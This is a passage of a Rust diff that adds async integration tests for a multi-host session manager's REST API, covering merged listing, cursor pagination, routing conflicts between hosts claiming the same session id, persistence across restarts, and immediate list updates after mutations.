+            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
+            let ControlMsg::StopSession { req_id, session_id } = request else {
+                panic!("expected StopSession, got {request:?}");
+            };
+            assert_eq!(session_id, "unbound-1");
+            writer
+                .write_control(&ControlMsg::SessionStopped { req_id })
+                .await
+                .unwrap();
+        });
+
+        let (builder, host) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@no-identity",
+                rest_harness::HostScript {
+                    // A supervisor with no standing to mint one reports
+                    // none; the wire allows it and the store cannot bind a
+                    // cache write to it.
+                    identity: None,
+                    sessions: vec![rest_harness::session("unbound-1", 100)],
+                    peer: Some(client_side),
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        harness.await_refreshed(host).await;
+
+        let (status, value) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(status, axum::http::StatusCode::OK);
+        assert_eq!(
+            row_ids(&value),
+            vec!["unbound-1"],
+            "an identity-less host's sessions must appear in the merged list"
+        );
+        assert_eq!(value["total"], 1, "and must be counted in the total");
+        assert_eq!(value["sessions"][0]["host"], host);
+        assert_eq!(
+            value["sessions"][0]["stale"], false,
+            "it is connected, so these are live rows"
+        );
+
+        // Nothing is persisted — the identity binding has nothing to bind
+        // to — which is exactly why the manager has to hold them.
+        assert!(
+            harness
+                .store
+                .cached_sessions(host)
+                .await
+                .expect("cache read")
+                .is_empty(),
+            "an identity-less host must write no cache at all"
+        );
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/unbound-1/stop",
+            serde_json::json!({}),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::OK,
+            "an identity-less host's sessions must route like any other: {body}"
+        );
+        peer.await.unwrap();
+
+        harness.fleet.take_down(host);
+        harness
+            .await_state(host, |state| state.phase() == "unreachable-reprobing")
+            .await;
+
+        let (_, value) = get_json(&harness, "/api/sessions").await;
+        assert!(
+            row_ids(&value).is_empty(),
+            "with no durable copy there is nothing to serve stale: {value}"
+        );
+        assert_eq!(value["total"], 0);
+        let (status, _) = get_json(&harness, "/api/sessions/unbound-1").await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::NOT_FOUND,
+            "and nothing to show behind a host-unreachable notice either"
+        );
+    }
+
+    /// A hostile or buggy supervisor claiming another host's session id must
+    /// not be able to steer an operation to the wrong machine — and while
+    /// the claim STANDS, no operation goes anywhere at all.
+    ///
+    /// Two rules, and the second is the one worth being explicit about.
+    /// helm.db refuses the second claim outright, so the LIST is coherent:
+    /// the first host keeps the session and the impostor's row is dropped.
+    /// But a session two hosts both report is genuinely ambiguous, and the
+    /// helm has no basis for deciding which of them the user meant — so
+    /// ROUTING fails closed for as long as both keep reporting it, rather
+    /// than quietly choosing the one that happened to cache first.
+    ///
+    /// The contest is refresh STATE, not a remembered incident: when the
+    /// impostor stops reporting the id, the next drain rebuilds its
+    /// contested set without it and routing resumes with no intervention.
+    /// That second half is asserted here because it is what makes the
+    /// refusal a temporary, self-clearing condition rather than a session
+    /// bricked by someone else's bug.
+    #[tokio::test]
+    async fn a_second_host_claiming_a_session_id_never_steals_its_routing() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let (owner_client, owner_peer) = tokio::io::duplex(64 * 1024);
+        let owner_task = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(owner_peer);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
+            let ControlMsg::StopSession { req_id, session_id } = request else {
+                panic!("expected StopSession, got {request:?}");
+            };
+            assert_eq!(session_id, "contested");
+            writer
+                .write_control(&ControlMsg::SessionStopped { req_id })
+                .await
+                .unwrap();
+        });
+        let (impostor_client, impostor_peer) = tokio::io::duplex(64 * 1024);
+        let impostor_task = tokio::spawn(silent_supervisor(impostor_peer));
+
+        let (builder, owner) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@owner",
+                rest_harness::HostScript {
+                    identity: Some("identity-owner".to_string()),
+                    sessions: vec![rest_harness::session("contested", 100)],
+                    peer: Some(owner_client),
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let (builder, impostor) = builder
+            .ssh(
+                "user@impostor",
+                rest_harness::HostScript {
+                    identity: Some("identity-impostor".to_string()),
+                    // The same id, from a machine that does not own it.
+                    sessions: vec![rest_harness::session("contested", 100)],
+                    peer: Some(impostor_client),
+                    // Held down until the owner has cached, so "first claim
+                    // holds" has a defined first. Two hosts racing to claim
+                    // one id is a real situation and either may win it, but
+                    // a test whose subject is what happens to the LOSER
+                    // cannot also leave who loses to chance.
+                    reachable: false,
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        harness.await_refreshed(owner).await;
+
+        harness
+            .fleet
+            .edit(impostor, |script| script.reachable = true);
+        harness
+            .manager
+            .retry_now(impostor)
+            .await
+            .expect("the impostor is registered");
+        harness.await_refreshed(impostor).await;
+
+        let (_, value) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(
+            row_ids(&value),
+            vec!["contested"],
+            "the contested id appears exactly once, not once per claimant: {value}"
+        );
+        assert_eq!(
+            value["sessions"][0]["host"], owner,
+            "the first claim holds; the later claimant's row is dropped"
+        );
+
+        // While BOTH report it, there is no honest owner to route to.
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/contested/stop",
+            serde_json::json!({}),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::CONFLICT,
+            "a session two hosts both claim must not be routed to either: {body}"
+        );
+        assert!(
+            body.contains(&owner.to_string()) && body.contains(&impostor.to_string()),
+            "and the refusal must name both candidates so the user can fix it: {body}"
+        );
+
+        // The impostor stops claiming it. Nothing is told to forget
+        // anything — the contest is rebuilt from the next drain's evidence,
+        // and that evidence no longer contains the id.
+        harness
+            .fleet
+            .edit(impostor, |script| script.sessions = Vec::new());
+        harness.fleet.kill_connection(impostor);
+        harness
+            .await_refreshed_as(impostor, "identity-impostor", 0)
+            .await;
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/contested/stop",
+            serde_json::json!({}),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::OK,
+            "a contest clears itself when the claimant stops claiming: {body}"
+        );
+        owner_task.await.unwrap();
+        // The impostor must never have been asked anything about it.
+        impostor_task.await.unwrap();
+
+        let (status, value) = get_json(&harness, "/api/sessions/contested").await;
+        assert_eq!(status, axum::http::StatusCode::OK);
+        assert_eq!(
+            value["host"], owner,
+            "the detail route and the routing decision must name the SAME host"
+        );
+    }
+
+    /// A refresh whose drain PREDATES a create must not erase the create.
+    ///
+    /// The window is wide and entirely ordinary: a refresh drains a host's
+    /// whole list over the network, a create lands during that drain and is
+    /// recorded, and the drain then commits a wholesale replacement built
+    /// from a snapshot in which the new session did not exist. The caller
+    /// has already been told its session exists; the list and the routing
+    /// would then contradict the answer they just gave it.
+    ///
+    /// Driven by a BARRIER rather than by timing: the scripted host's second
+    /// list reply is held until the create has completed, so the
+    /// interleaving under test is the one that actually happens rather than
+    /// whichever one a sleep happened to produce.
+    #[tokio::test]
+    async fn a_refresh_that_predates_a_create_cannot_erase_it() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let peer = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            loop {
+                let Ok(Some(frame)) = reader.read_frame().await else {
+                    return;
+                };
+                let Ok(ControlMsg::CreateSession { req_id, .. }) = parse_control(&frame) else {
+                    return;
+                };
+                writer
+                    .write_control(&ControlMsg::SessionCreated {
+                        req_id,
+                        session: rest_harness::session("created-mid-drain", 900),
+                    })
+                    .await
+                    .unwrap();
+            }
+        });
+
+        // Refreshing briskly, so a second walk really is in flight while the
+        // create runs. The host's canned list never mentions the new
+        // session — which is the point: it describes the world before it.
+        let harness = rest_harness::FleetBuilder::new()
+            .await
+            .refresh_every(std::time::Duration::from_millis(20))
+            .local(rest_harness::HostScript {
+                identity: Some("local-identity".to_string()),
+                sessions: vec![rest_harness::session("pre-existing", 100)],
+                peer: Some(client_side),
+                ..rest_harness::HostScript::default()
+            })
+            .await
+            .start()
+            .await;
+        let local = rest_harness::local_id(&harness.store).await;
+        harness.await_refreshed(local).await;
+
+        // Arm the barrier, then wait until the held walk has actually
+        // STARTED: from here on, whatever it eventually replies describes a
+        // world that predates the create below.
+        let release = harness.fleet.hold_next_list(local);
+        harness.fleet.await_list_requests(2).await;
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions",
+            serde_json::json!({ "cwd": "/tmp", "invocation": "agent" }),
+        )
+        .await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+
+        // The host now genuinely has the session, as a real one would the
+        // moment it answered the create. Only the HELD reply — built before
+        // any of this — still describes the world without it.
+        harness.fleet.edit(local, |script| {
+            script.sessions = vec![
+                rest_harness::session("created-mid-drain", 900),
+                rest_harness::session("pre-existing", 100),
+            ];
+        });
+
+        // Let the stale walk commit — or rather, discover that it may not.
+        let _ = release.send(());
+        // The held walk has committed (or declined to) by the time the NEXT
+        // one has started, which is a state the fleet reports rather than a
+        // duration this test has to guess at.
+        harness.fleet.await_list_requests(3).await;
+
+        let (status, value) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(status, axum::http::StatusCode::OK);
+        let mut ids = row_ids(&value);
+        ids.sort();
+        assert_eq!(
+            ids,
+            vec!["created-mid-drain", "pre-existing"],
+            "a refresh built before the create must not erase it: {value}"
+        );
+
+        // And it is routable, which is the promise the create made.
+        let (host, _) = crate::resolve_owner(&harness.state, "created-mid-drain")
+            .await
+            .expect("the created session must still have an owner");
+        assert_eq!(host, local);
+        peer.abort();
+    }
+
+    /// A byte-bounded persisted scan must FENCE the merge: a live host's
+    /// rows may not carry the cursor past cached rows nobody has been shown.
+    ///
+    /// The interleaving is specific and the loss is permanent. The store's
+    /// scan stops on its byte bound having returned FEWER rows than the
+    /// page asked for, so the merge still has capacity — and fills it from
+    /// an identity-less host's in-memory list, whose rows sort after the
+    /// cached ones the scan never reached. The page's cursor then names a
+    /// live row, and the next page resumes after it: every cached row
+    /// between the byte cut and that position is skipped, forever, with
+    /// nothing about either page looking wrong.
+    ///
+    /// The fixture is exactly that shape — one fat cached row, an unseen
+    /// cached successor, and a live row that sorts between them by time.
+    #[tokio::test]
+    async fn a_byte_cut_persisted_scan_fences_the_merge() {
+        let fat = farhelm_proto::SessionInfo {
+            // Alone larger than the page budget, so the scan stops right
+            // after it with a successor still unread.
+            title: "x".repeat(5 * 1024 * 1024),
+            ..rest_harness::session("cached-fat", 500)
+        };
+        let (builder, cached_host) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@cached",
+                rest_harness::HostScript {
+                    identity: Some("identity-cached".to_string()),
+                    // The successor sorts LAST, so a merge that ran past
+                    // the fence would leave it behind.
+                    sessions: vec![fat, rest_harness::session("cached-next", 100)],
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let (builder, live_host) = builder
+            .ssh(
+                "user@live",
+                rest_harness::HostScript {
+                    // No identity: this host caches nothing and serves from
+                    // the manager's memory, which is the other side of the
+                    // merge.
+                    identity: None,
+                    sessions: vec![rest_harness::session("live-middle", 300)],
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        harness.await_refreshed(cached_host).await;
+        harness.await_refreshed(live_host).await;
+
+        // Walk the whole list one page at a time. Every row must appear
+        // exactly once, in order — the property a fence-less merge breaks
+        // silently.
+        let mut walked: Vec<String> = Vec::new();
+        let mut uri = "/api/sessions?limit=10".to_string();
+        for _ in 0..10 {
+            let (status, value) = get_json(&harness, &uri).await;
+            assert_eq!(status, axum::http::StatusCode::OK);
+            walked.extend(row_ids(&value));
+            match value["next_cursor"].as_str() {
+                None => break,
+                Some(cursor) => uri = format!("/api/sessions?limit=10&cursor={cursor}"),
+            }
+        }
+        assert_eq!(
+            walked,
+            vec!["cached-fat", "live-middle", "cached-next"],
+            "every row exactly once, in the merged order — a fence-less merge loses the cached \
+             row after the byte cut"
+        );
+    }
+
+    /// The helm cursor must survive sessions coming and going between
+    /// pages, and `truncated` must be true on every page but the last.
+    ///
+    /// The stability half is the whole reason the cursor encodes a KEY: an
+    /// offset would shift under both mutations and silently re-serve or skip
+    /// a row, with nothing a caller could observe. The `truncated` half is
+    /// what the pre-M6 UI reads to draw "showing N of M", so it has to mean
+    /// something exact — "there is a next page" — rather than approximately.
+    #[tokio::test]
+    async fn a_page_walk_survives_creation_and_deletion_between_pages() {
+        let (harness, alpha, _beta) = three_host_fleet().await;
+
+        let (_, first) = get_json(&harness, "/api/sessions?limit=2").await;
+        assert_eq!(row_ids(&first), vec!["beta-newest", "alpha-new"]);
+        assert_eq!(
+            first["truncated"], true,
+            "entries remain, so this is not the final page"
+        );
+        let cursor = first["next_cursor"]
+            .as_str()
+            .expect("more pages")
+            .to_string();
+
+        // The row the cursor NAMES is deleted, and a brand-new session
+        // appears at the very front of the order — the two mutations a walk
+        // must be indifferent to.
+        harness.fleet.edit(alpha, |script| {
+            script.sessions = vec![
+                rest_harness::session("alpha-brand-new", 9_999),
+                rest_harness::session("alpha-old", 100),
+            ];
+        });
+        harness.fleet.kill_connection(alpha);
+        harness
+            .await_state(alpha, |state| {
+                matches!(
+                    state,
+                    crate::manager::HostState::Connected {
+                        last_refresh: crate::manager::RefreshHealth::Ok { sessions: 2 },
+                        ..
+                    }
+                )
+            })
+            .await;
+
+        let (_, second) =
+            get_json(&harness, &format!("/api/sessions?limit=2&cursor={cursor}")).await;
+        assert_eq!(
+            row_ids(&second),
+            vec!["local-mid", "alpha-old"],
+            "the walk resumes strictly after the deleted row's key, and never rewinds to the \
+             newly created one"
+        );
+        let cursor = second["next_cursor"]
+            .as_str()
+            .expect("one more")
+            .to_string();
+        let (_, third) =
+            get_json(&harness, &format!("/api/sessions?limit=2&cursor={cursor}")).await;
+        assert_eq!(row_ids(&third), vec!["beta-oldest"]);
+        assert_eq!(
+            third["truncated"], false,
+            "the final page says so, which is what stops a walking caller"
+        );
+        assert_eq!(third["next_cursor"], serde_json::Value::Null);
+    }
+
+    /// An over-large `?limit=` is refused rather than silently clamped.
+    ///
+    /// Silently clamping would leave a caller that asked for fifty thousand
+    /// and got five thousand with no way to tell it had not got what it
+    /// asked for — the reply looks identical to a genuinely short page.
+    #[tokio::test]
+    async fn an_over_large_page_limit_is_refused() {
+        let (harness, _alpha, _beta) = three_host_fleet().await;
+        let (status, body) = get_json(
+            &harness,
+            &format!(
+                "/api/sessions?limit={}",
+                crate::aggregate::MAX_PAGE_LIMIT + 1
+            ),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::BAD_REQUEST,
+            "an unbounded page is a request to do all the work at once: {body}"
+        );
+        let (status, _) = get_json(
+            &harness,
+            &format!("/api/sessions?limit={}", crate::aggregate::MAX_PAGE_LIMIT),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::OK,
+            "the cap itself is legal"
+        );
+    }
+
+    /// A create naming a host id nothing holds must 404, and must not fall
+    /// back to any other host.
+    ///
+    /// The fallback is the dangerous half: a create that quietly landed on
+    /// the local machine because the named host was gone would put a live
+    /// agent somewhere the user never asked for, and the reply would look
+    /// like success. The silent supervisor is what turns "no fallback" into
+    /// an assertion rather than a claim.
+    #[tokio::test]
+    async fn creating_on_an_unknown_host_is_refused_without_falling_back() {
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let peer = tokio::spawn(silent_supervisor(peer_side));
+        let harness = rest_harness::spliced_helm(client_side).await;
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions",
+            serde_json::json!({ "cwd": "/tmp", "invocation": "agent", "host": 9999 }),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::NOT_FOUND,
+            "a create naming a host nothing holds is a 404, not a create somewhere else: {body}"
+        );
+        peer.await.unwrap();
+    }
+
+    /// The stale list must survive a HELM restart: a fresh helm over the
+    /// same helm.db, with the host still down and no ensure file, serves
+    /// its sessions from the database alone.
+    ///
+    /// PLAN_M6.md's testing decisions are explicit that the restart leg runs
+    /// WITHOUT the ensure file, because an ensure file would rebuild the
+    /// registry entry and mask a broken persistence path — the assertion is
+    /// that the destination, the identity, and the stale sessions all come
+    /// from helm.db.
+    #[tokio::test]
+    async fn the_stale_list_survives_a_helm_restart_from_helm_db_alone() {
+        let (builder, host) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@remembered",
+                rest_harness::HostScript {
+                    identity: Some("identity-remembered".to_string()),
+                    sessions: vec![rest_harness::session("survivor", 100)],
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let first = builder.start().await;
+        first.await_refreshed(host).await;
+        let (_, before) = get_json(&first, "/api/sessions").await;
+        assert_eq!(row_ids(&before), vec!["survivor"]);
+
+        // A NEW helm over the same database, with the host now down — the
+        // manager, its actors, and the router are all built from scratch.
+        let restarted = first.restart_with(|fleet| fleet.take_down(host)).await;
+        restarted
+            .await_state(host, |state| state.phase() == "unreachable-reprobing")
+            .await;
+
+        let (status, value) = get_json(&restarted, "/api/sessions").await;
+        assert_eq!(status, axum::http::StatusCode::OK);
+        assert_eq!(
+            row_ids(&value),
+            vec!["survivor"],
+            "the stale list must come back from helm.db alone: {value}"
+        );
+        assert_eq!(value["sessions"][0]["stale"], true);
+        assert_eq!(value["sessions"][0]["host_name"], "user@remembered");
+
+        let (_, hosts) = get_json(&restarted, "/api/hosts").await;
+        let row = hosts["hosts"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|entry| entry["id"] == host)
+            .expect("the registry entry survived too");
+        assert_eq!(
+            row["identity"], "identity-remembered",
+            "the identity is durable, not re-learned from a host that is down"
+        );
+    }
+
+    /// A session created on an IDENTITY-LESS host must be routable at once,
+    /// exactly like one created on a host that caches.
+    ///
+    /// Such a host writes no cache at all, so the create's durable seed has
+    /// nowhere to go — and the version of this that only seeded the store
+    /// skipped it silently, leaving every immediate operation 404ing on
+    /// precisely the hosts whose sessions are hardest to see. The promise is
+    /// "created here is routable now", and it cannot hold for one storage
+    /// shape and not the other.
+    #[tokio::test]
+    async fn a_session_created_on_an_identity_less_host_is_routable_at_once() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let peer = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            loop {
+                let Ok(Some(frame)) = reader.read_frame().await else {
+                    return;
+                };
+                match parse_control(&frame) {
+                    Ok(ControlMsg::CreateSession { req_id, .. }) => writer
+                        .write_control(&ControlMsg::SessionCreated {
+                            req_id,
+                            session: rest_harness::session("unbound-new", 900),
+                        })
+                        .await
+                        .unwrap(),
+                    Ok(ControlMsg::StopSession { req_id, session_id }) => {
+                        assert_eq!(session_id, "unbound-new");
+                        writer
+                            .write_control(&ControlMsg::SessionStopped { req_id })
+                            .await
+                            .unwrap();
+                    }
+                    _ => return,
+                }
+            }
+        });
+
+        let (builder, host) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@no-identity",
+                rest_harness::HostScript {
+                    identity: None,
+                    sessions: Vec::new(),
+                    peer: Some(client_side),
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        harness.await_refreshed(host).await;
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions",
+            serde_json::json!({ "cwd": "/tmp", "invocation": "agent", "host": host }),
+        )
+        .await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/unbound-new/stop",
+            serde_json::json!({}),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::OK,
+            "a session created on an identity-less host must route immediately too: {body}"
+        );
+
+        // And it is in the list, in order, without waiting for a refresh.
+        let (_, value) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(row_ids(&value), vec!["unbound-new"]);
+        assert_eq!(value["total"], 1);
+        peer.abort();
+    }
+
+    /// A restart's reply must reach the LIST immediately, not at the owning
+    /// host's next refresh tick — and a delete must leave it immediately
+    /// too.
+    ///
+    /// The browser suite caught both as user-visible lies. A restart of an
+    /// exited session succeeded while the list went on saying `exited` for a
+    /// poll interval; and its own shared-session reset (delete, then create)
+    /// left the deleted row listed beside the new one, so a strict locator
+    /// found two rows where the test meant one. The merged view serves what
+    /// the helm has RECORDED, so every mutation that changes what a session
+    /// is — or whether it is — records the result.
+    #[tokio::test]
+    async fn a_restart_and_a_rename_reach_the_list_without_waiting_for_a_refresh() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let exited = farhelm_proto::SessionInfo {
+            status: farhelm_proto::SessionStatus::Exited { exit_code: Some(1) },
+            ..rest_harness::session("sess-1", 500)
+        };
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let renamed = farhelm_proto::SessionInfo {
+            title: "renamed-later".to_string(),
+            ..rest_harness::session("sess-1", 500)
+        };
+        let peer = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            loop {
+                let Ok(Some(frame)) = reader.read_frame().await else {
+                    return;
+                };
+                match parse_control(&frame) {
+                    // The host now reports it ALIVE — the whole point of
+                    // the restart the caller just made.
+                    Ok(ControlMsg::RestartSession { req_id, .. }) => writer
+                        .write_control(&ControlMsg::SessionRestarted {
+                            req_id,
+                            session: rest_harness::session("sess-1", 500),
+                        })
+                        .await
+                        .unwrap(),
+                    Ok(ControlMsg::RenameSession { req_id, .. }) => writer
+                        .write_control(&ControlMsg::SessionRenamed {
+                            req_id,
+                            session: renamed.clone(),
+                        })
+                        .await
+                        .unwrap(),
+                    Ok(ControlMsg::DeleteSession { req_id, .. }) => writer
+                        .write_control(&ControlMsg::SessionDeleted { req_id })
+                        .await
+                        .unwrap(),
+                    _ => return,
+                }
+            }
+        });
+
+        // The cached row says `exited`, and the harness refreshes once an
+        // hour — so anything the list shows differently was recorded by the
+        // mutation itself.
+        let harness = rest_harness::spliced_helm_listing(client_side, vec![exited]).await;
+        let (_, before) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(before["sessions"][0]["status"]["state"], "exited");
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/sess-1/restart",
+            serde_json::json!({ "mode": "fresh" }),
+        )
+        .await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+        let (_, after) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(
+            after["sessions"][0]["status"]["state"], "alive",
+            "a completed restart must not leave the list showing the state it restarted FROM"
+        );
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/sess-1/rename",
+            serde_json::json!({ "title": "renamed-later" }),
+        )
+        .await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+        let (_, after) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(
+            after["sessions"][0]["title"], "renamed-later",
+            "and a completed rename must not either"
+        );
+
+        // A delete is the quadrant the browser suite found missing: the row
+        // must be gone from the list the moment the delete answers, not at
+        // the next refresh.
+        let request = axum::http::Request::builder()
+            .method("DELETE")
+            .uri("/api/sessions/sess-1")
+            .header("host", "127.0.0.1:7433")
+            .body(axum::body::Body::empty())
+            .unwrap();
+        let response = tower::ServiceExt::oneshot(harness.router(), request)
+            .await
+            .unwrap();
+        assert_eq!(response.status(), axum::http::StatusCode::OK);
+        let (_, after) = get_json(&harness, "/api/sessions").await;
+        assert!(
+            row_ids(&after).is_empty(),
+            "a deleted session must leave the list at once, or a delete-then-create shows both: \
+             {after}"
+        );
+        peer.abort();
+    }
+
+    /// A mutation reply that says `Unknown` must not erase a status the
+    /// helm already knew.
+    ///
+    /// This is the lost-restart-reply case, reduced to the fact that
+    /// produced it. The browser suite's `a restart whose response is lost
+    /// still recovers the terminal` restarts a LIVE session with the reply
+    /// dropped on the client side, then reads the list and expects `alive`.
+    /// The restart itself really happened — the supervisor relaunched, and
+    /// the helm received and recorded the reply — but that reply carries
+    /// `SessionStatus::Unknown` BY CONTRACT: at the instant it is built the
+    /// pane exists and the agent's own `exec` inside it has not been
+    /// observed, and `SessionStatus::Unknown`'s own docs are explicit that
+    /// `ListSessions` is the only reply computing a real answer. Recording
+    /// it verbatim answered a successful restart with "the helm has no
+    /// idea", for a session it had definite knowledge about a moment
+    /// earlier.
+    ///
+    /// Both directions are pinned, because the rule is narrow on purpose: a
+    /// DEFINITE status in a reply is authoritative and wins immediately
+    /// (that is what makes a restart show `alive` without a refresh), and
+    /// only `Unknown` defers to what was already known. Every other field
+    /// of the reply is taken as given in both cases — the status alone is
+    /// knowledge the reply does not have.
+    #[tokio::test]
+    async fn a_reply_carrying_unknown_never_erases_a_known_status() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let alive = rest_harness::session("sess-1", 500);
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let peer = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            loop {
+                let Ok(Some(frame)) = reader.read_frame().await else {
+                    return;
+                };
+                let Ok(ControlMsg::RestartSession { req_id, .. }) = parse_control(&frame) else {
+                    return;
+                };
+                // Exactly what a real supervisor sends: a fresh offer and
+                // a deliberately unknown status (`publish_relaunched`).
+                writer
+                    .write_control(&ControlMsg::SessionRestarted {
+                        req_id,
+                        session: farhelm_proto::SessionInfo {
+                            status: farhelm_proto::SessionStatus::Unknown,
+                            restart_offer: farhelm_proto::RestartOffer::FreshOnly,
+                            title: "restarted".to_string(),
+                            ..rest_harness::session("sess-1", 500)
+                        },
+                    })
+                    .await
+                    .unwrap();
+            }
+        });
+
+        // The cached row is ALIVE, and the harness refreshes once an hour —
+        // so nothing but this restart can change what the list says.
+        let harness = rest_harness::spliced_helm_listing(client_side, vec![alive]).await;
+        let (_, before) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(before["sessions"][0]["status"]["state"], "alive");
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/sess-1/restart",
+            serde_json::json!({ "mode": "fresh" }),
+        )
+        .await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+
+        let (_, after) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(
+            after["sessions"][0]["status"]["state"], "alive",
+            "a reply that says 'not yet known' must not replace knowledge with its absence: \
+             {after}"
+        );
+        assert_eq!(
+            after["sessions"][0]["title"], "restarted",
+            "every other field of the reply is authoritative and lands at once"
+        );
+        assert_eq!(
+            after["sessions"][0]["restart_offer"], "fresh_only",
+            "including the freshly recomputed offer the restart exists to produce"
+        );
+        peer.abort();
+    }
+
+    /// A mutation whose reply could not improve the cached status must
+    /// WAKE the owning host's refresh, so the definite answer arrives in one
+    /// round trip rather than one refresh interval.
+    ///
+    /// This is the other half of the no-degrade rule, and without it that
+    /// rule pays for its own correctness with a visible lag. Restarting an
+    /// EXITED session is the case that shows it: the reply says `Unknown`
+    /// (deliberately — the pane exists, the agent's exec has not been
+    /// observed), the merge declines to record it over the cached `exited`,
+    /// and the list therefore goes on saying `exited` after a restart that
+    /// succeeded. A user watching that sees their own successful action
+    /// look like a failed one, for as long as the cadence says — which is
+    /// exactly what the browser suite caught, on one engine and not the
+    /// other, because a one-shot assertion races the interval.
+    ///
+    /// The harness refreshes once an HOUR and this test never advances the
+    /// clock, so the transition asserted below cannot have come from the
+    /// ordinary cadence: only the wake can have produced it. The woken drain
+    /// must also be a POST-seed one — it samples the seed epoch when it
+    /// starts, so a pre-seed snapshot would correctly decline to commit and
+    /// leave the lag in place.
+    #[tokio::test]
+    async fn a_restart_that_cannot_improve_the_status_wakes_the_refresh() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let exited = farhelm_proto::SessionInfo {
+            status: farhelm_proto::SessionStatus::Exited { exit_code: Some(1) },
+            ..rest_harness::session("sess-1", 500)
+        };
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let peer = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            loop {
+                let Ok(Some(frame)) = reader.read_frame().await else {
+                    return;
+                };
+                let Ok(ControlMsg::RestartSession { req_id, .. }) = parse_control(&frame) else {
+                    return;
+                };
+                // What a real supervisor sends: the relaunch happened, and
+                // its liveness is not yet knowable.
+                writer
+                    .write_control(&ControlMsg::SessionRestarted {
+                        req_id,
